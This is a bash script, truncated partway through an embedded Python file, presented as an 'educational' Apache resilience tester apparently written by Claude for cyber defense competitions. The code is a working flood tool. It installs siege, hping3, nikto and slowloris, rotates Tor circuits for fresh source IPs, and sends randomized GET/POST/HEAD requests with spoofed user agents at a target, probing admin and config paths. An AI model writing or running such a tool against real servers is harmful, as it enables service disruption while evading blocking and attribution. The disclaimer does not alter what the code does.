#!/bin/bash
# Ubuntu_Apache_Tester.sh
# Purpose: Educational script to test Apache service resilience
# Usage: ./Ubuntu_Apache_Tester.sh [target_ip] [duration_in_minutes]
# Author: Claude for educational purposes
# Note: Use only in authorized cyber defense competitions

# Check if arguments are provided
if [ $# -lt 2 ]; then
  echo "Usage: $0 [target_ip] [duration_in_minutes]"
  exit 1
fi

TARGET_IP=$1
DURATION=$(($2 * 60))  # Convert minutes to seconds
END_TIME=$(($(date +%s) + $DURATION))

# Install required packages
echo "[*] Installing required packages..."
sudo apt-get update
sudo apt-get install -y python3-pip apache2-utils siege tor proxychains hping3 nikto

# Install Python packages
pip3 install slowloris requests PySocks

# Configure TOR for IP rotation
echo "[*] Configuring TOR for IP rotation..."
sudo systemctl start tor
sudo bash -c 'echo "MaxCircuitDirtiness 35" >> /etc/tor/torrc'
sudo bash -c 'echo "NewCircuitPeriod 15" >> /etc/tor/torrc'
sudo systemctl restart tor

# Create connection rotation function
rotate_connection() {
  echo "[*] Rotating TOR circuit for new IP..."
  sudo killall -HUP tor
  sleep 2
}

# Create Python script for random HTTP requests
cat > apache_test.py << 'EOF'
import requests
import random
import sys
import time
import string
from concurrent.futures import ThreadPoolExecutor

target_ip = sys.argv[1]
base_url = f"http://{target_ip}"

# Common paths to try - include potential backend paths
paths = [
    "/",
    "/index.html",
    "/index.php",
    "/cgi-bin/",
    "/admin/",
    "/wp-admin/",
    "/phpmyadmin/",
    "/server-status",
    "/api/",
    "/.htaccess",
    "/includes/",
    "/config/",
    "/tmp/",
    "/uploads/"
]

# List of user agents
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) Version/13.0.3',
    'curl/7.68.0',
    'Wget/1.20.3 (linux-gnu)',
    'Apache-HttpClient/4.5.12 (Java/11.0.8)'
]

# Common file extensions to try
extensions = ['', '.html', '.php', '.cgi', '.pl', '.asp', '.jsp', '.txt', '.bak', '.old']

# Function to make a single request
def make_request():
    try:
        # Pick a random path and possibly append extension
        path = random.choice(paths)
        if random.random() > 0.5 and path.endswith('/'):
            path += ''.join(random.choice(string.ascii_lowercase) for _ in range(6))
            path += random.choice(extensions)
            
        url = f"{base_url}{path}"
        headers = {'User-Agent': random.choice(user_agents)}
        
        # Add random query parameters
        if random.random() > 0.5:
            num_params = random.randint(1, 4)
            params = {}
            for _ in range(num_params):
                param_name = ''.join(random.choice(string.ascii_lowercase) for _ in range(5))
                param_value = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8))
                params[param_name] = param_value
        else:
            params = {}
        
        # Choose a random HTTP method
        method = random.choice(['GET', 'POST', 'HEAD'])
        
        if method == 'GET':
            requests.get(url, headers=headers, params=params, timeout=2)
        elif method == 'POST':
            # Random form data or JSON
            if random.random() > 0.5:
                data = {
                    ''.join(random.choice(string.ascii_lowercase) for _ in range(6)): 
                    ''.join(random.choice(string.ascii_letters) for _ in range(10))
                    for _ in range(random.randint(1, 5))
                }
                requests.post(url, headers=headers, data=data, timeout=2)
            else:
                json_data = {
                    ''.
